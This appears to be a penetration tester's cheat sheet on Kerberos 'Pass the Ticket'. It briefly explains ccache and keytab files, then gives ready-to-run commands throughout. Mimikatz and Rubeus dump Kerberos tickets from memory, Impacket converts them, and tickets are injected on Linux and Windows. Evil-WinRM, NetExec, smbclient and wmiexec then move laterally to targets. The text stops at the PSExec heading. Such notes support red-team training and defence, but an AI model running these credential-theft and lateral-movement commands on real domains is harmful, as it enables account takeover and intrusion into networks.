---
Primary_category: "[[KERBEROS]]"
title: PASS THE TICKET
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses: 
---

###### PRIMARY CATEGORY → [[KERBEROS]]


#### *Theory*

##### *CCache*

On ***Domain-Joined Linux Machines***, the sensivite information related to an active ***Logon Session*** is not stored in the ***LSASS.exe***'s memory space, as occurs in Windows

In this case, kerberos tickets and encryption keys are stored on the file system instead of in memory, in the following type of files →

> ***Kerberos Credential Cache***

Temporal file which stores ***Kerberos Credentials*** related to a ***Kerberos Principal***, usually a user account

it stores →

- ***Ticket Granting Ticket (TGT)***
- ***Ticket Granting Service (TGS)***

it allows a client to authenticate to other ***Domain-related Services*** using the ***TGT*** stored in this file, without having to provide the password again

it is usually **stored in `/tmp`**

To list the content of this file →

```bash
klist -c <ccache_file>
```

In order to use a ***Credential Cache*** file, its path must be specified in the ***KRB5CCNAME*** environment parameter

##### *Keytab*

> ***Kerberos Key Table***

It contains ***Kerberos' Key/Principal*** pairs

It stores all the ***Kerberos Encryption Keys*** →

- ***NTLM Hash***
- ***AES-128***
- ***AES-256***

Note that the above keys are derived from the ***User's password***

To list information about a ***Keytab File*** →

```bash
klist -k -t <keytab_file>
```

##### *Identifying a Domain-Joined Linux Machine*

###### *Realm*

```bash
command -V realm &> /dev/null && realm list
```

###### *Pgrep*

```bash
pgrep --full --list-full -- 'winbind|sssd'
```



---

#### *Harvesting Kerberos Tickets*

#####  *Mimikatz*

> ***[Mimikatz](https://github.com/ParrotSec/mimikatz)***

###### *All Kerberos Tickets on the System*

> ***Elevated Privileges needed as `sekurlsa` module is used***

- ***Export Kerberos Tickets to .KIRBI Files***

```bash
mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::tickets /export' exit
```

- ***Export Kerberos Tickets to Base64 Format***

```bash
mimikatz.exe 'privilege::debug' 'token::elevate' 'standard::base64 /output:true' 'sekurlsa::tickets /export' exit
```

###### *All Kerberos Tickets on the Current Session*

> ***Elevated Privileges not needed as the `kerberos` module allow to play with official [Microsoft Kerberos API](https://learn.microsoft.com/es-es/windows/win32/api/ntsecapi/ne-ntsecapi-kerb_protocol_message_type?redirectedfrom=MSDN)***

- ***Export Kerberos Tickets to Base64 Format***

```bash
mimikatz.exe 'standard::base64 /output:true' 'kerberos::list /export' exit
```

##### *Rubeus*

> ***[Rubeus](https://github.com/GhostPack/Rubeus)***

###### *TGTs and TGSs (All Kerberos Tickets)*

> ***If executed from a privileged context, all Kerberos Tickets on the System are listed. Otherwise, only those in the current session are listed***

```bash
rubeus.exe dump /nowrap
```

###### *All TGTs on the System*

> ***Elevated privilege needed***

```bash
rubeus.exe dump /service:krbtgt /nowrap
```

---

#### *Ticket Conversion*

##### *CCache → Kirbi*

###### *ticketConverter.py - Impacket*

> ***[ticketConverter.py](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py)***

```bash
ticketConverter.py <CCACHE> <KIRBI>
```

##### *Kirbi → CCache*

###### *ticketConverter.py - Impacket*

> ***[ticketConverter.py](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py)***

```bash
ticketConverter.py <KIRBI> <CCACHE>
```

##### *Kirbi → Base64*

###### *Base64*

> ***Linux*** 🐧

```bash
base64 -w 0 -- <KIRBI>
```

###### *[Convert]::ToBase64String*

> ***Windows (PS)*** 🪟

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<KIRBI>"))
```
---

#### *Ticket Injection - Linux*

##### *KRB5CCNAME*

The only thing we need in order to perform a ***Pass the Ticket*** on a ***Linux Machine*** is a ***[[#CCache|Credential Cache]]*** file that we have ***Read Permissions*** again

So we could import that ***Credential Cache*** into our current session →

```bash
export KRB5CCNAME=<CCACHE_FILE>
```

And check it as follows →

```bash
klist
```

From that, we can perform ***Pass the Ticket*** using tools that support ***Kerberos Authentication*** as indicated [[#Passing the Ticket|here]]

---

#### *Ticket Injection - Windows*

> ***[Logon Session Types](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)***

##### *Mimikatz*

> ***[Mimikatz](https://github.com/gentilkiwi/mimikatz/)***

###### *Current LUID*

> ***No Elevated Privileges needed, `kerberos` module used***

```bash
mimikatz.exe 'kerberos::ptt "<KIRBI_FILE>"' exit # KIRBI's Full Path
```

###### *Another LUID*

> ***No Elevated Privileges needed, `kerberos` module used***

- ***Logon Session Type 9 (NewCredentials) creation with Dummy Credentials***

***Runas***

```bash
runas.exe /netonly /user:<USERNAME> cmd.exe # Or Powershell.exe
```

- ***Ticket Injection into the created Logon Session***

```bash
mimikatz.exe 'kerberos::ptt "<KIRBI_FILE>"' exit # KIRBI's Full Path
```

##### *Rubeus*

###### *.KIRBI*

```bash
rubeus ptt /ticket:<KIRBI>
```

###### *Base64 String*

```bash
rubeus ptt /ticket:<BASE64_STRING>
```

---

#### *Passing the Ticket*

##### *Setup*

As mentioned, an attacker can forge some ***Kerberos Tickets*** without the need to harvesting them from ***[[#CCache|Credential Cache]]*** files

This could be done if the ***Kerberos Encryption Keys (EKeys)*** of a given ***Kerberos Principal*** are grabbed from somewhere

First, simply install the following package in your attacking host

```bash
apt install -y -- krb5-user
```

In order to correctly contact with the ***Domain Controller (DC)*** of a given domain, some parameters must be specified in the following configuration file

```bash
/etc/krb5.conf
```

***Configuration Parameters →***

```bash /DOMAIN.TLD/
[libdefaults]
        default_realm = <DOMAIN.TLD>

...SNIP...

[realms]
    <DOMAIN.TLD> = {
        kdc = <DC01.DOMAIN.TLD>
    }

...SNIP...
```

The above directives are necessary since some tools take this file as a reference, such as ***[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)***

This package also provides us with tools such as `klist` or `kinit`


##### *Evil-WinRM*

> ***[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)***

> ***Important*** → ***See [[#Setup|this]]***

```bash
evil-winrm --ip <TARGET> --realm <REALM>
```

> [!DANGER]- *e.g.*
>
> ```bash
> evil-winrm --ip dc01.test.tld --realm test.tld
>```
>

##### *Netexec*

> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
netexec <PROTOCOL> <TARGET> --use-kcache
```

##### *Smbclient*

```bash
smbclient --use-kerberos=required --no-pass --list <TARGET>
```

##### *Impacket*

###### *Smbclient.py*

> ***[SMBClient.py](https://github.com/roo7break/impacket/blob/master/examples/smbclient.py)***

```bash
smbclient.py -k -no-pass <TARGET>
```

###### *WMIExec.py*

> ***[WMIExec.py](https://github.com/un33k/impacket/blob/master/examples/wmiexec.py)***

```bash
wmiexec.py -k -no-pass <TARGET>
```

###### *PSExec.py*

> ***[PSExec.py](https://github.com/veso266/impacket/blob/master/examples/psexec.py)***
